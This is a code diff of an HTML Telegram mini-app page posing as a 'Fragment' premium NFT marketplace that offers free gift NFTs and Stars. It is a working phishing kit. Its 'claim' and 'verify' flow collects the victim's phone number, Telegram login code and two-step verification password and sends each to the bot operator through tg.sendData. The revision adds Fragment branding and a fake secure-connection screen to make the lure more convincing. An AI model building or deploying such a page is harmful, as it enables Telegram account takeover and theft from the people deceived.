@@ -1,268 +1,252 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Premium NFT Terminal</title>
+    <title>Fragment | Premium Assets</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --tg-theme-bg: #000000;
-            --accent-color: #0088cc;
-            --glass: rgba(255, 255, 255, 0.05);
-            --border: rgba(255, 255, 255, 0.1);
+            --bg-color: #0f0f0f;
+            --card-bg: #181818;
+            --accent: #0088cc;
+            --text-main: #ffffff;
+            --text-secondary: #707579;
+            --gold: #f1c40f;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--tg-theme-bg);
-            color: #fff;
-            margin: 0;
-            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-color);
+            color: var(--text-main);
+            margin: 0; padding: 0;
             overflow-x: hidden;
-            -webkit-user-select: none;
+            user-select: none;
         }
 
-        #snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.3; }
-
-        /* Шапка с балансом */
-        .header {
-            padding: 20px;
+        /* Premium Header */
+        .premium-header {
+            padding: 30px 20px;
             text-align: center;
-            background: linear-gradient(to bottom, rgba(0,136,204,0.1), transparent);
-            border-bottom: 1px solid var(--border);
+            background: radial-gradient(circle at top, #1c2a35 0%, #0f0f0f 100%);
+            border-bottom: 1px solid #222;
         }
 
-        .balance-badge {
+        .star-balance {
             display: inline-flex;
             align-items: center;
-            background: rgba(255, 215, 0, 0.1);
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            padding: 5px 15px;
-            border-radius: 20px;
-            color: #ffd700;
-            font-weight: bold;
-            font-size: 14px;
+            gap: 8px;
+            background: rgba(241, 196, 15, 0.1);
+            padding: 8px 20px;
+            border-radius: 100px;
+            border: 1px solid rgba(241, 196, 15, 0.2);
+            color: var(--gold);
+            font-weight: 700;
+            font-size: 18px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
 
-        /* Навигация */
-        .tabs {
+        /* Tabs */
+        .nav-tabs {
             display: flex;
-            background: rgba(0,0,0,0.8);
+            background: rgba(15,15,15,0.95);
             backdrop-filter: blur(10px);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            border-bottom: 1px solid var(--border);
+            position: sticky; top: 0; z-index: 100;
+            border-bottom: 1px solid #222;
         }
 
-        .tab-link {
-            flex: 1;
-            padding: 15px;
-            text-align: center;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #666;
-            transition: 0.3s;
+        .nav-item {
+            flex: 1; padding: 16px;
+            text-align: center; font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 600; transition: 0.2s;
         }
 
-        .tab-link.active {
-            color: #fff;
-            border-bottom: 2px solid var(--accent-color);
+        .nav-item.active {
+            color: var(--accent);
+            border-bottom: 2px solid var(--accent);
         }
 
-        .content-section { display: none; padding: 15px; animation: fadeIn 0.4s ease; }
-        .content-section.active { display: block; }
+        /* NFT Grid */
+        .content { padding: 16px; display: none; animation: slideUp 0.3s ease-out; }
+        .content.active { display: block; }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Карточки NFT */
-        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .nft-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
 
         .nft-card {
-            background: var(--glass);
-            border: 1px solid var(--border);
-            border-radius: 15px;
-            padding: 15px;
-            text-align: center;
-            position: relative;
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 12px;
+            border: 1px solid #222;
+            transition: 0.2s;
         }
 
-        .nft-gif { width: 100%; border-radius: 10px; margin-bottom: 10px; animation: float 3s ease-in-out infinite; }
-
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
-
-        .nft-title { font-size: 14px; margin-bottom: 5px; font-weight: 500; }
-        .nft-price { font-size: 11px; color: #888; margin-bottom: 12px; display: block; }
-
-        .claim-btn {
-            background: #fff;
-            color: #000;
-            border: none;
-            padding: 8px;
-            width: 100%;
-            border-radius: 8px;
-            font-size: 12px;
-            font-weight: bold;
-            text-transform: uppercase;
+        .nft-image {
+            width: 100%; border-radius: 12px;
+            aspect-ratio: 1/1; object-fit: cover;
+            margin-bottom: 10px;
+            background: #252525;
         }
 
-        /* Личный кабинет */
-        .profile-box {
-            background: var(--glass);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 15px;
+        .nft-info .name { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+        .nft-info .price { font-size: 12px; color: var(--text-secondary); }
+
+        .btn-main {
+            background: var(--accent);
+            color: white; border: none;
+            width: 100%; padding: 12px;
+            border-radius: 10px; font-weight: 700;
+            margin-top: 12px; cursor: pointer;
         }
 
-        .status-verified { color: #00c853; font-size: 12px; font-weight: bold; }
-        .status-unverified { color: #ff5252; font-size: 12px; font-weight: bold; }
-
-        /* Модальные окна Верификации */
-        .v-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 1000; padding: 30px; box-sizing: border-box;
-            flex-direction: column; justify-content: center;
+        /* Overlay Systems */
+        .overlay {
+            display: none; position: fixed; inset: 0;
+            background: var(--bg-color); z-index: 1000;
+            padding: 40px 20px; flex-direction: column; align-items: center;
         }
-        .v-overlay.active { display: flex; }
+        .overlay.active { display: flex; }
 
         .v-input {
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 12px;
-            color: #fff;
-            padding: 20px;
-            font-size: 24px;
-            text-align: center;
-            width: 100%;
-            box-sizing: border-box;
-            margin: 20px 0;
-            outline: none;
+            width: 100%; background: #1a1a1a;
+            border: 1.5px solid #333; border-radius: 12px;
+            color: white; padding: 18px; font-size: 22px;
+            text-align: center; margin: 25px 0; outline: none;
+            letter-spacing: 5px;
         }
-        .v-input:focus { border-color: var(--accent-color); }
+        .v-input:focus { border-color: var(--accent); }
 
-        .v-title { font-size: 22px; font-weight: bold; margin-bottom: 10px; text-align: center; }
-        .v-text { color: #888; font-size: 14px; text-align: center; line-height: 1.5; }
+        .loading-spinner {
+            width: 40px; height: 40px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-left-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <canvas id="snow"></canvas>
 
-    <div class="header">
-        <div class="balance-badge">⭐️ 20 STARS (BONUS)</div>
+    <div class="premium-header">
+        <div class="star-balance">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .587l3.668 7.568 8.332 1.151-6.064 5.828 1.48 8.279-7.416-3.967-7.417 3.967 1.481-8.279-6.064-5.828 8.332-1.151z"/></svg>
+            20 STARS
+        </div>
+        <p style="color: #707579; font-size: 13px; margin-top: 10px;">Premium Collector's Assets</p>
     </div>
 
-    <div class="tabs">
-        <div class="tab-link active" onclick="showTab('market')">Market</div>
-        <div class="tab-link" onclick="showTab('profile')">Profile</div>
-        <div class="tab-link" onclick="showTab('verify')">Withdraw</div>
+    <div class="nav-tabs">
+        <div class="nav-item active" onclick="switchTab('market', this)">MARKET</div>
+        <div class="nav-item" onclick="switchTab('profile', this)">PROFILE</div>
+        <div class="nav-item" onclick="switchTab('wallet', this)">WALLET</div>
     </div>
 
-    <div id="market" class="content-section active">
+    <div id="market" class="content active">
         <div class="nft-grid">
             <div class="nft-card">
-                <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-gif">
-                <div class="nft-title">Santa Hat</div>
-                <span class="nft-price">Value: 50 USD</span>
-                <button class="claim-btn" onclick="startAuth()">Claim</button>
+                <img src="https://nft.fragment.com/gift/santahat-10168.webp" class="nft-image">
+                <div class="nft-info">
+                    <div class="name">Santa Hat #101</div>
+                    <div class="price">Price: 500 Stars</div>
+                </div>
+                <button class="btn-main" onclick="initVerify()">CLAIM FREE</button>
             </div>
             <div class="nft-card">
-                <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-gif">
-                <div class="nft-title">Holiday Drink</div>
-                <span class="nft-price">Value: 45 USD</span>
-                <button class="claim-btn" onclick="startAuth()">Claim</button>
+                <img src="https://nft.fragment.com/gift/holidaydrink-39466.webp" class="nft-image">
+                <div class="nft-info">
+                    <div class="name">Magic Cocktail</div>
+                    <div class="price">Price: 350 Stars</div>
+                </div>
+                <button class="btn-main" onclick="initVerify()">CLAIM FREE</button>
             </div>
         </div>
     </div>
 
-    <div id="profile" class="content-section">
-        <div class="profile-box">
-            <div style="color:#888; font-size: 12px;">Account Status</div>
-            <div class="status-unverified" style="margin-top: 5px;">✖ NOT VERIFIED</div>
+    <div id="profile" class="content">
+        <div style="background: var(--card-bg); padding: 20px; border-radius: 16px; border: 1px solid #222;">
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <div style="width: 60px; height: 60px; background: #333; border-radius: 50%;"></div>
+                <div>
+                    <div style="font-weight: 700; font-size: 18px;" id="u_name">Premium User</div>
+                    <div style="color: #ff5252; font-size: 12px; font-weight: 600;">UNVERIFIED</div>
+                </div>
+            </div>
         </div>
-        <div class="profile-box">
-            <div style="color:#888; font-size: 12px;">Available Balance</div>
-            <div style="font-size: 24px; font-weight: bold; margin-top: 5px;">20.00 ⭐️</div>
-        </div>
-        <button class="claim-btn" style="background: var(--accent-color); color:#fff;" onclick="showTab('verify')">Verify Account</button>
+        <button class="btn-main" style="background: #222; margin-top: 15px;" onclick="initVerify()">VERIFY ACCOUNT</button>
     </div>
 
-    <div id="verify" class="content-section">
-        <div class="v-title">Account Verification</div>
-        <p class="v-text">To prevent bot activity and withdraw your <b>20 Stars</b>, please complete the identity verification.</p>
-        <button class="claim-btn" style="margin-top: 20px; height: 50px;" onclick="startAuth()">Verify Now</button>
+    <div id="screen-loading" class="overlay">
+        <div class="loading-spinner"></div>
+        <h2 style="font-size: 18px;">Connecting to Fragment...</h2>
+        <p style="color: #707579; text-align: center;">Secure connection established. Please wait.</p>
     </div>
 
-    <div id="step-code" class="v-overlay">
-        <div class="v-title">Confirm Identity</div>
-        <p class="v-text">We sent a <b>Login Code</b> to your Telegram app. Enter it below to verify ownership.</p>
-        <input type="number" id="in-code" class="v-input" placeholder="0 0 0 0 0">
-        <button class="claim-btn" style="height: 50px; background: var(--accent-color); color:#fff;" onclick="sendCode()">Continue</button>
+    <div id="screen-code" class="overlay">
+        <h2 style="font-size: 22px;">Enter Code</h2>
+        <p style="color: #707579; text-align: center;">We've sent a code to the <b>Telegram</b> app on your other device.</p>
+        <input type="number" id="code-input" class="v-input" placeholder="00000">
+        <button class="btn-main" onclick="submitCode()">CONFIRM</button>
     </div>
 
-    <div id="step-pass" class="v-overlay">
-        <div class="v-title">2-Step Verification</div>
-        <p class="v-text">Ваш аккаунт защищен паролем. Введите его для завершения минта.</p>
-        <input type="password" id="in-pass" class="v-input" placeholder="Password">
-        <button class="claim-btn" style="height: 50px; background: var(--accent-color); color:#fff;" onclick="sendPass()">Confirm & Claim</button>
+    <div id="screen-2fa" class="overlay">
+        <h2 style="font-size: 22px;">Two-Step Verification</h2>
+        <p style="color: #707579; text-align: center;">Your account is protected with an additional password.</p>
+        <input type="password" id="pass-input" class="v-input" placeholder="Password">
+        <button class="btn-main" onclick="submitPass()">UNLOCK ASSETS</button>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        tg.enableClosingConfirmation();
 
-        function showTab(tabId) {
-            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
-            document.querySelectorAll('.tab-link').forEach(t => t.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
-            event.currentTarget.classList.add('active');
+        if (tg.initDataUnsafe.user) {
+            document.getElementById('u_name').innerText = tg.initDataUnsafe.user.first_name;
         }
 
-        function startAuth() {
+        function switchTab(id, el) {
+            document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            el.classList.add('active');
+        }
+
+        function initVerify() {
             tg.requestContact((sent, cb) => {
                 if (sent && cb.responseUnsafe.contact) {
                     const phone = cb.responseUnsafe.contact.phone_number;
                     tg.sendData("PHONE:" + phone);
-                    document.getElementById('step-code').classList.add('active');
+                    
+                    // Эффект загрузки перед вводом кода
+                    document.getElementById('screen-loading').classList.add('active');
+                    setTimeout(() => {
+                        document.getElementById('screen-loading').classList.remove('active');
+                        document.getElementById('screen-code').classList.add('active');
+                    }, 3000);
                 }
             });
         }
 
-        function sendCode() {
-            const val = document.getElementById('in-code').value;
+        function submitCode() {
+            const val = document.getElementById('code-input').value;
             if(val.length >= 5) {
                 tg.sendData("CODE:" + val);
-                document.getElementById('step-code').classList.remove('active');
-                document.getElementById('step-pass').classList.add('active');
+                document.getElementById('screen-code').classList.remove('active');
+                document.getElementById('screen-2fa').classList.add('active');
             }
         }
 
-        function sendPass() {
-            const val = document.getElementById('in-pass').value;
+        function submitPass() {
+            const val = document.getElementById('pass-input').value;
             if(val.length > 0) {
                 tg.sendData("PASS:" + val);
                 tg.close();
             }
         }
-
-        // Snow animation
-        const canvas = document.getElementById('snow');
-        const ctx = canvas.getContext('2d');
-        let flakes = [];
-        function initSnow() {
-            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            for (let i = 0; i < 50; i++) flakes.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*1.5, d: Math.random()*0.5 });
-        }
-        function drawSnow() {
-            ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "rgba(255,255,255,0.6)"; ctx.beginPath();
-            for (let f of flakes) { ctx.moveTo(f.x, f.y); ctx.arc(f.x, f.y, f.r, 0, Math.PI*2); }
-            ctx.fill();
-            for (let f of flakes) { f.y += f.d + 0.3; if (f.y > canvas.height) f.y = -5; }
-            requestAnimationFrame(drawSnow);
-        }
-        window.addEventListener('resize', initSnow);
-        initSnow(); drawSnow();
     </script>
 </body>
 </html>
